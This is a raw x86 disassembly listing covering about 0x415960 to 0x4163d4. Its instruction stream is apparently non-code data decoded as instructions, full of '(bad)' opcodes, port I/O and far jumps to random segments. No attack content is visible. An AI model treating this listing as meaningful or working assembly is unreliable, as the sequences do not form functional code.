  415960:	cmp    ecx,DWORD PTR ds:0x4845fd8d
  415966:	adc    eax,DWORD PTR [esi]
  415968:	sbb    ecx,DWORD PTR [edx+0x7e]
  41596b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41596c:	sbb    eax,0xbd3c2c9c
  415971:	scas   al,BYTE PTR es:[edi]
  415972:	nop
  415973:	je     0x4158f6
  415975:	(bad)  
  415977:	pushfw 
  415979:	or     ah,dh
  41597b:	adc    BYTE PTR [esi+0x68],cl
  41597e:	or     cl,BYTE PTR [esp+ecx*8+0xab92e70]
  415985:	push   ss
  415986:	ds adc eax,0xdcfc42d8
  41598c:	and    DWORD PTR [edx+0x8fcb4e],0x0
	...
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	adc    eax,0x36e96087
  415a05:	in     al,0x0
  415a07:	add    BYTE PTR ds:0x32000001,al
  415a0d:	add    BYTE PTR [ebx-0x2f0f6065],0xa9
  415a14:	lea    ebx,[ebp*1-0x73c56bc1]
  415a1b:	cmp    dl,bl
  415a1d:	outs   dx,BYTE PTR ds:[esi]
  415a1e:	xor    edi,DWORD PTR [ebx-0x2a219c63]
  415a24:	push   eax
  415a25:	xchg   edi,eax
  415a26:	push   cs
  415a27:	pushf  
  415a28:	sub    ebx,ecx
  415a2a:	test   eax,0x70094f88
  415a2f:	add    al,0x19
  415a31:	mov    ecx,0x758fcf55
  415a36:	in     eax,0x36
  415a38:	aaa    
  415a39:	and    bh,BYTE PTR [ecx-0x2d]
  415a3c:	sbb    cl,BYTE PTR [ebx]
  415a3e:	pushf  
  415a3f:	cmp    bh,bl
  415a41:	fnstsw WORD PTR [ebx]
  415a43:	bound  ebp,QWORD PTR [ecx-0x77]
  415a46:	ret    0x538f
  415a49:	xchg   ebp,eax
  415a4a:	mov    eax,ds:0x33040998
  415a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a50:	into   
  415a51:	loop   0x415a53
  415a53:	jae    0x4159e0
  415a55:	add    al,0x67
  415a57:	inc    esp
  415a58:	inc    ebp
  415a59:	enter  0x539d,0xf
  415a5d:	mov    eax,0xfea5c756
  415a62:	or     eax,ebp
  415a64:	inc    eax
  415a65:	ins    BYTE PTR es:[edi],dx
  415a66:	(bad)  
  415a68:	jmp    0xc70ba6f4
  415a6d:	xor    dl,BYTE PTR [edx-0x4]
  415a70:	mov    cl,0x1d
  415a72:	fisttp WORD PTR [eax-0x2fe7ff68]
  415a78:	(bad)  
  415a7a:	dec    esi
  415a7b:	mov    esp,0x21d76f74
  415a80:	mov    al,0x70
  415a82:	jo     0x415a4f
  415a84:	cdq    
  415a85:	push   ss
  415a86:	pop    ebx
  415a87:	std    
  415a88:	loopne 0x415ae6
  415a8a:	sub    cl,bh
  415a8c:	in     al,0xd2
  415a8e:	mov    fs,WORD PTR [ecx+0x79]
  415a91:	mov    dl,0x9e
  415a93:	fsub   st(0),st
  415a95:	scas   eax,DWORD PTR es:[edi]
  415a96:	dec    ebp
  415a97:	call   0xc4187bda
  415a9c:	ror    bh,0x1
  415a9f:	mov    ebx,0xd5c100bb
  415aa4:	sti    
  415aa5:	adc    ah,BYTE PTR [edx-0x58]
  415aa8:	rcl    DWORD PTR [ebx+ecx*8],cl
  415aab:	jns    0x415abe
  415aad:	pop    ebp
  415aae:	push   esp
  415aaf:	jle    0x415a41
  415ab1:	fild   WORD PTR [edi+0xa]
  415ab4:	sbb    edi,DWORD PTR [ecx+0x3d]
  415ab7:	cmp    BYTE PTR [ebx+0x4be15fc5],0x93
  415abe:	inc    ecx
  415abf:	inc    eax
  415ac0:	pop    es
  415ac1:	xchg   edi,eax
  415ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ac3:	adc    esp,ebx
  415ac5:	in     al,dx
  415ac6:	jmp    FWORD PTR [edi]
  415ac8:	out    dx,eax
  415ac9:	mov    ch,0x82
  415acb:	cli    
  415acc:	mov    eax,0x87948fc8
  415ad1:	cmp    BYTE PTR [ecx+0x20],bl
  415ad4:	shr    BYTE PTR [eax+0x1dbece9d],cl
  415ada:	ds pushf 
  415adc:	aam    0x25
  415ade:	into   
  415adf:	leave  
  415ae0:	in     al,0x60
  415ae2:	sahf   
  415ae3:	mov    WORD PTR [ebx+0x12],gs
  415ae6:	cmp    BYTE PTR [edx+ebp*8+0x1993ff71],0x8d
  415aee:	mov    eax,0x3e326c59
  415af3:	test   DWORD PTR [eiz*1-0x3b588034],ebp
  415afa:	inc    esi
  415afb:	rol    DWORD PTR [eax-0x1797b4c5],cl
  415b01:	add    esp,DWORD PTR [esi]
  415b03:	jne    0x415b4b
  415b05:	(bad)  
  415b06:	ss jge 0x415b09
  415b09:	xchg   esi,eax
  415b0a:	retf   0x917a
  415b0d:	jp     0x415b81
  415b0f:	and    bl,bh
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fadd   QWORD PTR [ebp+0x62]
  415b82:	or     al,0xf1
  415b84:	cmp    esp,ebp
  415b86:	add    BYTE PTR [eax],al
  415b88:	add    eax,0xfa000001
  415b8d:	add    ah,BYTE PTR [ebx+0x7fbd036f]
  415b93:	popf   
  415b94:	adc    eax,0xa7f0c243
  415b99:	fs sbb eax,0x2f87f2a7
  415b9f:	sar    BYTE PTR [ebx+0x3c],1
  415ba2:	push   ebp
  415ba3:	jge    0x415bf4
  415ba5:	mov    eax,0xeb65bb43
  415baa:	das    
  415bab:	rcr    DWORD PTR [ebp-0x29],cl
  415bae:	popa   
  415baf:	dec    edi
  415bb0:	pop    esp
  415bb1:	out    0x99,eax
  415bb3:	push   ecx
  415bb4:	sbb    ch,0xd6
  415bb7:	cmp    esi,ebx
  415bb9:	add    esp,ebx
  415bbb:	jge    0x415bbc
  415bbd:	adc    ecx,ebp
  415bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bc0:	dec    esp
  415bc1:	adc    al,0xc6
  415bc3:	int3   
  415bc4:	cwde   
  415bc5:	xor    BYTE PTR [ecx-0x3d13f1ee],0x5f
  415bcc:	mov    bh,0xf2
  415bce:	sub    ebx,DWORD PTR [edx+eiz*1-0x223799dd]
  415bd5:	xchg   edi,eax
  415bd6:	mov    bl,0x6f
  415bd8:	add    DWORD PTR [edx],esp
  415bda:	cs xchg esi,eax
  415bdc:	and    bl,BYTE PTR [esi-0x6c]
  415bdf:	ret    
  415be0:	xor    DWORD PTR [eax],eax
  415be2:	inc    esp
  415be3:	mov    dl,0x1e
  415be5:	inc    esi
  415be6:	pop    ds
  415be7:	mov    eax,ds:0x873bf53d
  415bec:	enter  0x250a,0x8c
  415bf0:	lahf   
  415bf1:	fcmovne st,st(4)
  415bf3:	or     eax,0x7ea23bba
  415bf8:	push   ds
  415bf9:	jae    0x415b9e
  415bfb:	js     0x415bc8
  415bfd:	(bad)  
  415bfe:	xchg   ebx,eax
  415bff:	inc    edx
  415c00:	xor    dh,BYTE PTR [ecx]
  415c02:	inc    esi
  415c03:	loopne 0x415c54
  415c05:	push   ebp
  415c06:	jmp    0xd671:0x98655e12
  415c0d:	xchg   ebx,eax
  415c0e:	mov    ecx,0x1afbdb52
  415c13:	shl    bl,0x83
  415c16:	daa    
  415c17:	push   cs
  415c18:	add    edx,ebp
  415c1a:	jns    0x415c4d
  415c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c1d:	sub    esi,DWORD PTR [edx+0x74]
  415c20:	es test eax,0x38445f65
  415c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c27:	(bad)  [edx-0x69b5c789]
  415c2d:	enter  0xd0e9,0x74
  415c31:	out    0xe2,eax
  415c33:	sbb    eax,0x26f624ef
  415c38:	je     0x415c97
  415c3a:	sub    edx,DWORD PTR [edi+0x3dcd5e2f]
  415c40:	jle    0x415cb1
  415c42:	push   esi
  415c43:	fidiv  WORD PTR [ebx-0x400ec995]
  415c49:	dec    esi
  415c4a:	add    eax,0x44581112
  415c4f:	iret   
  415c50:	push   0xc35aa003
  415c55:	jmp    0x4f725b99
  415c5a:	push   es
  415c5b:	rcl    dh,0x4f
  415c5e:	mov    ds:0xadc15db4,al
  415c63:	icebp  
  415c64:	xor    al,0x71
  415c66:	outs   dx,DWORD PTR ds:[esi]
  415c67:	inc    ecx
  415c68:	div    BYTE PTR [edx]
  415c6a:	retf   
  415c6b:	mov    ds:0x3037b98f,al
  415c70:	xchg   BYTE PTR [edi],bh
  415c72:	rol    DWORD PTR [eax-0x6f],cl
  415c75:	aas    
  415c76:	fistp  WORD PTR [esi+eax*2+0x79]
  415c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c7b:	aas    
  415c7c:	mov    esi,0x4e9476e5
  415c81:	loopne 0x415cf1
  415c83:	in     eax,0xed
  415c85:	nop
  415c86:	and    bh,0x3f
  415c89:	xchg   esp,eax
  415c8a:	jge    0x415c80
  415c8c:	push   0xb9bdf712
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x8279561f
  415d03:	je     0x415d45
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR ds:0x8c000001,al
  415d0d:	fidivr WORD PTR [esi-0x42]
  415d10:	test   edx,0xb547d07b
  415d16:	jbe    0x415cf1
  415d18:	mov    esi,0xc9c0d134
  415d1d:	je     0x415d32
  415d1f:	xor    eax,0xfd75859c
  415d24:	jecxz  0x415cb7
  415d26:	out    dx,eax
  415d27:	data16 fcmovb st,st(1)
  415d2a:	in     eax,0x85
  415d2c:	and    bh,cl
  415d2e:	pop    es
  415d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d30:	push   edi
  415d31:	mov    BYTE PTR [edi-0xe],bl
  415d34:	adc    bh,BYTE PTR [ebx+ebx*4+0x3d795b18]
  415d3b:	les    edx,FWORD PTR [eax+0xe]
  415d3e:	lods   al,BYTE PTR ds:[esi]
  415d3f:	xor    DWORD PTR [esi+0x1c],ebx
  415d42:	pop    ss
  415d43:	test   eax,0x6338d859
  415d48:	pusha  
  415d49:	adc    al,0x8f
  415d4b:	mov    dl,0x31
  415d4d:	mov    ebp,DWORD PTR [ebx-0x6]
  415d50:	push   cs
  415d51:	fild   WORD PTR [ebx+0x1c5076bb]
  415d57:	inc    ebx
  415d58:	fxch   st(5)
  415d5a:	test   BYTE PTR [ebp+0x46298fb1],al
  415d60:	rol    BYTE PTR [ebx+0x3c],1
  415d63:	scas   al,BYTE PTR es:[edi]
  415d64:	test   al,0xde
  415d66:	adc    edi,esi
  415d68:	xor    bh,al
  415d6a:	mov    esp,0xe2771b29
  415d6f:	ja     0x415d28
  415d71:	fwait
  415d72:	retf   0x3df2
  415d75:	push   cs
  415d76:	mov    dl,0xc
  415d78:	aas    
  415d79:	jp     0x415d8b
  415d7b:	cli    
  415d7c:	xchg   DWORD PTR [edx+0x1c4ad11a],edi
  415d82:	pop    ecx
  415d83:	push   esp
  415d84:	stc    
  415d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d86:	sbb    eax,0xf2030b2e
  415d8b:	dec    ecx
  415d8c:	stos   DWORD PTR es:[edi],eax
  415d8d:	inc    edi
  415d8e:	cmc    
  415d8f:	fsub   st(5),st
  415d91:	ja     0x415dfe
  415d93:	or     DWORD PTR [ecx+esi*4-0x40],ebp
  415d97:	clc    
  415d98:	(bad)  
  415d9a:	stos   BYTE PTR es:[edi],al
  415d9b:	retf   0x2b58
  415d9e:	idiv   BYTE PTR ds:0x765ff105
  415da4:	pop    ebx
  415da5:	leave  
  415da6:	mov    dl,0x9d
  415da8:	adc    al,0xfd
  415daa:	add    DWORD PTR [edi],0x6b
  415dad:	es inc eax
  415daf:	inc    esi
  415db0:	sbb    BYTE PTR [ecx+0x6d834beb],dl
  415db6:	outs   dx,DWORD PTR ds:[esi]
  415db7:	xor    ecx,DWORD PTR [ecx]
  415db9:	data16 fadd DWORD PTR [ecx]
  415dbc:	cmp    BYTE PTR [esi-0x55e18cb1],0x66
  415dc3:	aam    0x55
  415dc5:	mov    ds:0x5d5e57c3,eax
  415dca:	add    al,cl
  415dcc:	mov    eax,0x634aecba
  415dd1:	aas    
  415dd2:	add    DWORD PTR [edx],esp
  415dd4:	adc    BYTE PTR cs:[ecx+ebp*1-0x500b517e],ah
  415ddc:	inc    esp
  415ddd:	add    al,0x66
  415ddf:	push   eax
  415de0:	inc    edi
  415de1:	in     al,0x45
  415de3:	mov    eax,ds:0x50587f28
  415de8:	hlt    
  415de9:	add    DWORD PTR [ebx],0x4f857f19
  415def:	push   0x7778c02b
  415df4:	cs xchg ebx,eax
  415df6:	mov    ebp,0x5703e338
  415dfb:	add    eax,0x87bc3045
  415e00:	repz pushf 
  415e02:	dec    ebx
  415e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e04:	outs   dx,DWORD PTR ds:[esi]
  415e05:	clc    
  415e06:	test   al,0x15
  415e08:	(bad)  
  415e09:	push   ebx
  415e0a:	jmp    0x8b5dbe2a
  415e0f:	mov    edi,0xca
	...
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x50]
  415e81:	stc    
  415e82:	sar    DWORD PTR [ebp+0x45],0xe7
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    eax,0x37000001
  415e8d:	call   0x5d9f:0xce541799
  415e94:	pop    esp
  415e95:	mov    esi,?
  415e97:	add    edx,ebp
  415e99:	nop
  415e9a:	stos   BYTE PTR es:[edi],al
  415e9b:	shl    BYTE PTR [eax+0x70086b60],1
  415ea1:	mov    ebx,0x537f2398
  415ea6:	mov    ebx,0xab8a35e6
  415eab:	imul   ebp,DWORD PTR [ecx],0x10
  415eae:	scas   eax,DWORD PTR es:[edi]
  415eaf:	fld    QWORD PTR [ebx-0x25]
  415eb2:	adc    al,0xd2
  415eb4:	imul   esp,DWORD PTR [eax-0x6429807c],0x2a
  415ebb:	mov    esp,DWORD PTR [edx+0x19]
  415ebe:	dec    edi
  415ebf:	loopne 0x415ef6
  415ec1:	imul   edi,edi,0x4f28c26d
  415ec7:	pushf  
  415ec8:	mov    esp,0xd589f1aa
  415ecd:	adc    eax,0x982dda4
  415ed2:	inc    esp
  415ed3:	out    0xc4,al
  415ed5:	add    ebp,esp
  415ed7:	jmp    0xf1b1:0x16470161
  415ede:	(bad)  
  415edf:	jle    0x415e82
  415ee1:	jns    0x415f3f
  415ee3:	ins    DWORD PTR es:[edi],dx
  415ee4:	call   0xee85:0xb7c5cbe1
  415eeb:	xor    eax,0x3d2ef040
  415ef0:	mov    eax,0xa4e44f8b
  415ef5:	sar    BYTE PTR [esi],cl
  415ef7:	push   esp
  415ef8:	outs   dx,BYTE PTR ds:[esi]
  415ef9:	cmp    ebx,DWORD PTR [ebp+eiz*1-0x11f61dff]
  415f00:	sub    ah,BYTE PTR [edi-0x1d]
  415f03:	imul   ebp,ebx,0xffffffad
  415f06:	inc    eax
  415f07:	mov    cl,0x1a
  415f09:	pusha  
  415f0a:	int3   
  415f0b:	mov    cl,0x4f
  415f0d:	xor    eax,0x8ba5645a
  415f12:	imul   ebx,DWORD PTR [eax+0x2],0x39
  415f16:	and    ecx,ebx
  415f18:	dec    ecx
  415f19:	adc    eax,0x68207775
  415f1e:	(bad)  
  415f1f:	repz mov WORD PTR [ebx+0x6f],fs
  415f23:	(bad)  
  415f26:	shr    bl,0x7e
  415f29:	inc    eax
  415f2a:	mov    cl,BYTE PTR [eax-0x18]
  415f2d:	mov    cl,0xf5
  415f2f:	xchg   ecx,eax
  415f30:	std    
  415f31:	jmp    0x3171:0xea31d36
  415f38:	lods   al,BYTE PTR ds:[esi]
  415f39:	into   
  415f3a:	adc    al,0x32
  415f3c:	repz pop ebp
  415f3e:	mov    dl,0xec
  415f40:	dec    ebx
  415f41:	jno    0x415f18
  415f43:	jne    0x415f4a
  415f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f46:	xchg   esi,eax
  415f47:	push   ds
  415f48:	fwait
  415f49:	call   0x7e47576f
  415f4e:	scas   al,BYTE PTR es:[edi]
  415f4f:	cmc    
  415f50:	(bad)  
  415f51:	(bad)
  415f56:	xor    cl,al
  415f58:	loop   0x415f80
  415f5a:	ret    0x686e
  415f5d:	xchg   ecx,eax
  415f5e:	(bad)  
  415f61:	mov    bl,0x82
  415f63:	or     al,0x15
  415f65:	or     al,0xa2
  415f67:	xchg   ebx,eax
  415f68:	test   eax,0x24cc24ff
  415f6d:	dec    eax
  415f6e:	les    ebp,FWORD PTR [esi+0x64]
  415f71:	dec    edx
  415f72:	cmp    cl,dh
  415f74:	gs leave 
  415f76:	jae    0x415f9c
  415f78:	push   edi
  415f79:	shl    BYTE PTR [esi],1
  415f7b:	rcr    DWORD PTR [edi+0x6f],0xa6
  415f7f:	fimul  DWORD PTR [esp+ecx*4+0x2b]
  415f83:	mov    ah,0xa8
  415f85:	hlt    
  415f86:	daa    
  415f87:	shr    bl,0x90
  415f8a:	cwde   
  415f8b:	inc    eax
  415f8c:	or     eax,0xe4d5775f
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	pop    eax
  416001:	xor    eax,0xe84a751a
  416006:	add    BYTE PTR [eax],al
  416008:	add    eax,0xd5000001
  41600d:	fwait
  41600e:	hlt    
  41600f:	fiadd  WORD PTR [ebx+ecx*8+0x4b]
  416013:	cld    
  416014:	xor    eax,DWORD PTR [edx+eiz*2]
  416017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416018:	shr    BYTE PTR [edi+eax*2-0x36],0x34
  41601d:	dec    edi
  41601f:	push   esp
  416020:	jno    0x416039
  416022:	sbb    eax,0x326f2289
  416027:	ds inc esi
  416029:	xchg   ebp,eax
  41602a:	mov    eax,ds:0x3a2538a1
  41602f:	shl    DWORD PTR [edx-0x6e],cl
  416032:	jae    0x4160a2
  416034:	pop    esi
  416035:	dec    esp
  416036:	int3   
  416037:	lahf   
  416038:	add    ch,BYTE PTR [ebx]
  41603a:	mov    WORD PTR [eax-0x7a],cs
  41603d:	jae    0x41603d
  41603f:	inc    eax
  416040:	sbb    eax,0x13b78ec4
  416045:	mov    esi,0xcda8c057
  41604a:	pusha  
  41604b:	mov    cl,ah
  41604d:	cwde   
  41604e:	lock xchg edx,eax
  416050:	enter  0x647e,0xda
  416054:	fisub  DWORD PTR [ecx+0x445f89e2]
  41605a:	pop    edi
  41605b:	adc    eax,ebp
  41605d:	sub    al,0xa8
  41605f:	mov    ds:0x5eb59738,al
  416064:	xchg   bh,bl
  416066:	in     eax,0xef
  416068:	ins    BYTE PTR es:[edi],dx
  416069:	sbb    edi,DWORD PTR [ebx+ebp*2-0x5cad0c41]
  416070:	dec    esi
  416071:	mov    dh,0x21
  416073:	and    BYTE PTR [esi+0x41eb31b8],al
  416079:	sub    dl,dl
  41607b:	adc    al,0x8f
  41607d:	test   al,0xf2
  41607f:	shr    ch,1
  416081:	mov    ds:0x3bd7eb96,al
  416086:	inc    ecx
  416087:	ficomp DWORD PTR cs:[esi-0x3f05dca6]
  41608e:	shl    BYTE PTR [edi],0xd2
  416091:	push   esp
  416092:	fstp   TBYTE PTR [ebx+0x4c]
  416095:	mov    ah,0x57
  416097:	es or  eax,0x6e432476
  41609d:	pusha  
  41609e:	inc    edx
  41609f:	and    BYTE PTR [ebx-0x8],cl
  4160a2:	dec    esp
  4160a3:	mov    esi,0x38eeeafd
  4160a8:	inc    ebx
  4160a9:	or     ch,BYTE PTR [edx+0x73fc6a35]
  4160af:	and    DWORD PTR [ebx-0x8],ebp
  4160b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160b3:	jnp    0x4160fd
  4160b5:	mov    ebx,0x42801b29
  4160ba:	ret    0x2d14
  4160bd:	(bad)  
  4160bf:	sbb    DWORD PTR [ebp+0x5],edi
  4160c2:	pop    esp
  4160c3:	shl    edi,1
  4160c5:	push   cs
  4160c6:	dec    ebx
  4160c7:	loop   0x41604a
  4160c9:	das    
  4160ca:	xchg   ecx,eax
  4160cb:	ins    BYTE PTR es:[edi],dx
  4160cc:	or     DWORD PTR [ecx],0x5f6ae26b
  4160d2:	das    
  4160d3:	cwde   
  4160d4:	inc    edx
  4160d5:	outs   dx,BYTE PTR ds:[esi]
  4160d6:	(bad)  
  4160d8:	dec    ecx
  4160d9:	das    
  4160da:	jns    0x416127
  4160dc:	add    ah,bh
  4160de:	sub    al,0xf3
  4160e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160e2:	fnstsw WORD PTR [edx]
  4160e4:	cmp    ebx,ecx
  4160e6:	scas   al,BYTE PTR es:[edi]
  4160e7:	cmp    bh,0x2
  4160ea:	lods   eax,DWORD PTR ds:[esi]
  4160eb:	mov    BYTE PTR [ebp+0x7b],ah
  4160ee:	mov    bh,0x97
  4160f0:	arpl   cx,di
  4160f2:	xchg   edi,eax
  4160f3:	adc    al,0x89
  4160f5:	scas   eax,DWORD PTR es:[edi]
  4160f6:	repz adc BYTE PTR [ebp+0x7090ea38],cl
  4160fd:	in     eax,dx
  4160fe:	jo     0x416094
  416100:	cmp    BYTE PTR [esi],ch
  416102:	jg     0x41612b
  416104:	ja     0x4160c1
  416106:	call   0xb47e:0x348e7c9
  41610d:	dec    ebp
  41610e:	repz pop ebp
  416110:	xor    eax,0x0
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0xcf2362f3
  416183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416184:	dec    edi
  416185:	jmp    0x146618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	sbb    al,0x11
  41618e:	pop    ss
  41618f:	fs dec esi
  416191:	daa    
  416192:	stos   BYTE PTR es:[edi],al
  416193:	or     ah,BYTE PTR ds:0x95302a30
  416199:	dec    esp
  41619a:	stos   DWORD PTR es:[edi],eax
  41619b:	pop    esp
  41619c:	pop    ecx
  41619d:	(bad)  
  41619e:	jnp    0x416123
  4161a0:	fwait
  4161a1:	mov    ah,al
  4161a3:	jecxz  0x4161e0
  4161a5:	in     al,0x87
  4161a7:	xchg   ebx,eax
  4161a8:	movaps xmm2,xmm4
  4161ab:	dec    esi
  4161ac:	inc    esi
  4161ad:	xor    bl,BYTE PTR ds:[ebp+0x75e436e2]
  4161b4:	inc    esi
  4161b5:	pop    edi
  4161b7:	and    esp,ecx
  4161b9:	inc    ebp
  4161ba:	sub    edx,DWORD PTR [ecx+0x7ee8a7f5]
  4161c0:	ror    DWORD PTR [esi],0x76
  4161c3:	(bad)  
  4161c4:	sti    
  4161c5:	sub    esi,edx
  4161c7:	mov    ecx,0xfef688a7
  4161cc:	mov    ebp,0x68f48ada
  4161d1:	test   DWORD PTR [eax+0x5d],esi
  4161d4:	dec    esi
  4161d5:	add    esi,eax
  4161d7:	inc    eax
  4161d8:	(bad)  
  4161d9:	pop    esp
  4161da:	xor    DWORD PTR [ebx],ebp
  4161dc:	mov    esp,0xabfd0a31
  4161e1:	mov    edi,0x62af737a
  4161e6:	adc    al,BYTE PTR [ebp+0x28]
  4161e9:	enter  0x72bc,0xa4
  4161ed:	mov    eax,DWORD PTR [edi-0x41d36c6]
  4161f3:	(bad)  
  4161f4:	sti    
  4161f5:	adc    eax,0x9dd95121
  4161fa:	out    dx,eax
  4161fb:	(bad)  
  4161fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161fe:	sbb    eax,0x41a9327c
  416203:	repnz cmp ecx,edx
  416206:	(bad)  
  416207:	mov    cl,0xab
  416209:	mov    eax,ds:0xd40aeab8
  41620e:	mov    edi,0x1e0b4276
  416213:	jg     0x4161aa
  416215:	fmul   DWORD PTR [ebp+0x6a]
  416218:	daa    
  416219:	xchg   edi,eax
  41621a:	pop    es
  41621b:	push   eax
  41621c:	pop    ss
  41621d:	inc    ebp
  41621e:	out    dx,al
  41621f:	mov    ecx,0xe0bf92f7
  416224:	mov    al,0x6d
  416226:	shl    BYTE PTR ds:0xe0dc766a,0x31
  41622d:	mov    ebp,0x30fe0ac1
  416232:	mov    ebx,0xaf92ec26
  416237:	sbb    BYTE PTR [ecx+0x71],ch
  41623a:	das    
  41623b:	int    0x16
  41623d:	pop    ds
  41623e:	pushf  
  41623f:	xchg   DWORD PTR [edi],ecx
  416241:	gs sub edx,ecx
  416244:	xchg   edi,eax
  416245:	or     al,0x83
  416247:	sub    esp,DWORD PTR [eax-0x7c009f67]
  41624d:	and    al,0x68
  41624f:	adc    BYTE PTR [eax+esi*2+0x75],cl
  416253:	pop    edx
  416254:	sar    BYTE PTR [ebx-0x751a3986],1
  41625a:	stos   BYTE PTR es:[edi],al
  41625b:	push   esi
  41625c:	xor    al,0xd3
  41625e:	push   ss
  41625f:	ja     0x416246
  416261:	xchg   ecx,eax
  416262:	push   ds
  416263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416264:	or     BYTE PTR [ebx-0x197cbc72],dh
  41626a:	pop    ecx
  41626b:	cwde   
  41626c:	enter  0xcc3,0xed
  416270:	lds    esp,FWORD PTR [ebx-0x7e72fea8]
  416276:	xor    eax,0x1a93d121
  41627b:	scas   eax,DWORD PTR es:[edi]
  41627c:	iret   
  41627d:	push   eax
  41627e:	mov    ch,0x4b
  416280:	(bad)  
  416281:	xchg   ecx,eax
  416282:	hlt    
  416283:	sbb    al,0x9b
  416285:	aam    0x3b
  416287:	sub    BYTE PTR [eax-0x20],ah
  41628a:	dec    edi
  41628b:	js     0x4162c9
  41628d:	stos   DWORD PTR es:[edi],eax
  41628e:	mov    ecx,0x521d
	...
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x54da:0x59fa0dee
  416305:	jmp    0x0:0x1050000
  41630c:	jmp    0x416367
  41630e:	call   0x2297ea3c
  416313:	lods   al,BYTE PTR ds:[esi]
  416314:	jb     0x4162f4
  416316:	xor    ebx,DWORD PTR [edx+0x7fbe4c93]
  41631c:	push   edi
  41631d:	sbb    DWORD PTR es:[eax-0x65e9660a],esi
  416324:	pop    ds
  416325:	fld    DWORD PTR [eax]
  416327:	pop    ds
  416328:	shr    DWORD PTR [edx+0x7f],cl
  41632b:	sar    BYTE PTR [eax+0x784881b],1
  416331:	dec    ebx
  416332:	les    edx,FWORD PTR [edx-0x449a569f]
  416338:	xor    DWORD PTR [eax+0x6b42746c],eax
  41633e:	repz push edx
  416340:	xlat   BYTE PTR ds:[ebx]
  416341:	out    dx,eax
  416342:	scas   al,BYTE PTR es:[edi]
  416343:	popf   
  416344:	add    ebx,DWORD PTR [ebp+0x27]
  416347:	mov    esi,0x7f921fda
  41634c:	xchg   ebp,eax
  41634d:	jo     0x4162e6
  41634f:	ins    BYTE PTR es:[edi],dx
  416350:	cli    
  416351:	push   ebx
  416352:	add    al,0x85
  416354:	iret   
  416355:	xor    ebp,edx
  416357:	les    eax,FWORD PTR [edx+ebp*1]
  41635a:	popf   
  41635b:	aaa    
  41635c:	test   DWORD PTR [edx+0x10d72d29],0xadc1907a
  416366:	jmp    0xa7a73799
  41636b:	cli    
  41636c:	std    
  41636d:	sub    eax,0xf329dcc8
  416372:	sub    eax,0x601e5b87
  416377:	cmp    ebp,ecx
  416379:	lahf   
  41637a:	pop    ecx
  41637b:	mov    edx,?
  41637d:	sbb    BYTE PTR ds:0x18406e8b,ch
  416383:	adc    esp,edx
  416385:	or     dl,dh
  416387:	sbb    ah,BYTE PTR [ebp+0x14]
  41638a:	retf   
  41638b:	cmp    BYTE PTR [ebx+eax*1],0x20
  41638f:	xchg   esi,eax
  416390:	sbb    DWORD PTR [ebx-0x7de4b5ea],edi
  416396:	sbb    al,0xe4
  416398:	push   ss
  416399:	inc    ecx
  41639a:	or     BYTE PTR ds:0x8ada5a1e,ch
  4163a0:	push   ds
  4163a1:	mov    edi,0xa3d591b5
  4163a6:	jl     0x41633b
  4163a8:	push   ebp
  4163a9:	sub    ebx,DWORD PTR [ebp+edi*2+0x511d4b1d]
  4163b0:	jb     0x41642c
  4163b2:	xchg   ecx,eax
  4163b3:	xor    esi,DWORD PTR [ecx+edi*1-0x57fdd57b]
  4163ba:	cmp    edi,ebp
  4163bc:	cmp    ebp,DWORD PTR [edx-0x660eb1c]
  4163c2:	and    bl,dh
  4163c4:	imul   edi,DWORD PTR [edi],0x5cfb8b82
  4163ca:	xchg   DWORD PTR [edi+0x76c2546a],ecx
  4163d0:	stc    
  4163d1:	mov    dl,0xe4
  4163d3:	push   ebx
  4163d4:	repz retf 
